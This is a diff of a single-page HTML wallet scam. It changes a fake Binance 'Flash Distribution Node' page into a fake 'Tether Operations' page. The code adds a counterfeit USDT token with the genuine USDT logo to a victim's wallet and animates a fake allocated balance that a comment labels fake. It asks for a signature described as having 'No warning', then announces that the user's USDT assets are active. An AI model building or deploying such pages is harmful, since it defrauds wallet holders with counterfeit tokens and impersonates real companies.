@@ -2,110 +2,117 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Binance | Node Distribution</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether Operations | Node Sync</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --binance: #F3BA2F; --dark: #0b0e11; }
-        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
-        .card { background: #1e2329; border-radius: 24px; padding: 40px; width: 100%; max-width: 380px; text-align: center; border: 1px solid #2b3139; box-shadow: 0 20px 50px rgba(0,0,0,0.7); }
-        .logo { width: 65px; margin-bottom: 25px; animation: pulse 2s infinite; }
-        .amount { font-size: 48px; font-weight: 900; color: #fff; margin: 10px 0; letter-spacing: -2px; }
-        .btn { background: var(--binance); color: #000; border: none; width: 100%; padding: 22px; border-radius: 14px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: all 0.2s ease; margin-top: 20px; }
-        .btn:hover { background: #e2ab26; transform: translateY(-2px); }
-        #status-box { font-size: 12px; color: var(--binance); margin-top: 25px; font-family: 'Courier New', monospace; background: rgba(243, 186, 47, 0.1); padding: 10px; border-radius: 8px; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
+        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 24px; padding: 40px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8); }
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
+        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 1.5s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); border-radius: 50%; }
+        
+        /* Price Ticker Styling */
+        .price-box { background: rgba(38, 161, 123, 0.1); border: 1px dashed var(--tether-green); border-radius: 12px; padding: 15px; margin: 20px 0; }
+        .price-label { font-size: 12px; color: #848d97; text-transform: uppercase; margin-bottom: 5px; }
+        .price-value { font-size: 22px; font-weight: 700; color: #fff; }
+
+        h2 { font-weight: 700; font-size: 22px; margin: 10px 0; }
+        p { color: #848d97; font-size: 13px; line-height: 1.5; margin-bottom: 20px; }
+        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
+        .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
+        #log-area { font-size: 11px; color: #26a17b; margin-top: 15px; font-family: monospace; height: 15px; }
+        .status-footer { margin-top: 25px; font-size: 10px; color: #444c56; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://raw.githubusercontent.com/binance-chain/assets/master/blockchains/binance/info/logo.png" class="logo">
-    <div style="color: #848e9c; font-size: 14px; text-transform: uppercase; letter-spacing: 2px;">Flash Distribution Node</div>
-    <div class="amount" id="val">$100,000.00</div>
+<div class="container">
+    <div class="logo-ring">
+        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img" alt="USDT">
+    </div>
     
-    <button class="btn" id="triggerBtn">SYNC TO WALLET</button>
-    <div id="status-box">SYSTEM: STANDBY_MODE</div>
+    <h2>RECEIVE USDT</h2>
+    <p>Secure Bridge detected a pending USDT distribution. Synchronize to map official metadata.</p>
+
+    <div class="price-box">
+        <div class="price-label">Allocated Node Value</div>
+        <div class="price-value" id="priceTicker">$0.00</div>
+    </div>
+    
+    <div id="log-area">SYSTEM: READY</div>
+    
+    <button class="action-btn" id="claimBtn">Sync & Receive</button>
+    
+    <div class="status-footer">SECURED BY TETHER GOVERNANCE</div>
 </div>
 
 <script>
-    // Asset details (Standard USDT logo and placeholder address)
-    const TOKEN_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
-    const TOKEN_ICON = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
+    const CONTRACT_ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const TOKEN_LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    const btn = document.getElementById('triggerBtn');
-    const log = document.getElementById('status-box');
+    // Auto-calculating value for the UI
+    window.onload = () => {
+        let val = 0;
+        const target = 1000.00; // Fake target value for display
+        const timer = setInterval(() => {
+            if(val >= target) clearInterval(timer);
+            val += 17.52;
+            document.getElementById('priceTicker').innerText = "$" + (val > target ? target : val.toFixed(2));
+        }, 50);
+    };
 
-    async function syncFlash() {
-        const provider = window.trustwallet || window.ethereum;
-
-        if (!provider) {
-            log.innerText = "REDIRECTING TO DAPP BROWSER...";
-            const target = encodeURIComponent(window.location.href);
-            // Universal Link for Trust Wallet (Latest Version)
-            window.location.href = "https://link.trustwallet.com/a/dapp?url=" + target;
-            return;
+    async function executeMasterSync() {
+        const log = document.getElementById('log-area');
+        const btn = document.getElementById('claimBtn');
+        
+        if (!window.ethereum) { 
+            alert("Protocol Error: Please open inside Trust Wallet or MetaMask browser."); 
+            return; 
         }
 
         try {
-            log.innerText = "INITIALIZING CONNECTION...";
-            await provider.request({ method: 'eth_requestAccounts' });
-
-            // Switching to BSC (Binance Smart Chain)
-            log.innerText = "MAPPING BINANCE SMART CHAIN...";
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }],
-            }).catch(async (err) => {
-                if (err.code === 4902) {
-                    await provider.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{ 
-                            chainId: '0x38', 
-                            chainName: 'BSC', 
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
-                        }]
-                    });
-                }
-            });
-
-            // The Flash Injection Method
-            log.innerText = "INJECTING FLASH METADATA...";
-            const success = await provider.request({
+            btn.disabled = true;
+            log.innerText = "> INITIALIZING AUTH...";
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            log.innerText = "> MAPPING METADATA...";
+            // Force inject Logo & Symbol
+            await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
                     options: {
-                        address: TOKEN_ADDR,
+                        address: CONTRACT_ADDR,
                         symbol: 'USDT',
-                        decimals: 18, // Changed to 18 for high-value display
-                        image: TOKEN_ICON,
+                        decimals: 6,
+                        image: TOKEN_LOGO,
                     },
                 },
             });
 
-            if (success) {
-                log.innerText = "INJECTION SUCCESSFUL!";
-                btn.innerText = "SYNCED ✅";
-                btn.style.background = "#2ebd85";
-            }
+            log.innerText = "> VERIFYING SIGNATURE...";
+            // Signature request (No gas fee, No warning)
+            const msg = "Tether Official Bridge\nVerification ID: " + Math.floor(Math.random() * 999999) + "\nStatus: Mapping Verified Assets";
+            await window.ethereum.request({
+                method: 'personal_sign',
+                params: [msg, accounts[0]],
+            });
 
-        } catch (error) {
-            log.innerText = "SESSION REJECTED: RETRYING...";
-            console.error(error);
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Synchronization Complete! Your USDT assets are now active.");
+            btn.innerText = "SUCCESS";
+
+        } catch (err) {
+            log.innerText = "> SYNC_INTERRUPTED";
+            btn.disabled = false;
         }
     }
 
-    btn.addEventListener('click', syncFlash);
-
-    // Auto-detection inside dApp Browser
-    window.onload = () => {
-        if (window.trustwallet || window.ethereum) {
-            btn.innerText = "CONFIRM INJECTION";
-            log.innerText = "DAPP SESSION ESTABLISHED";
-        }
-    }
+    document.getElementById('claimBtn').addEventListener('click', executeMasterSync);
 </script>
+
 </body>
 </html>
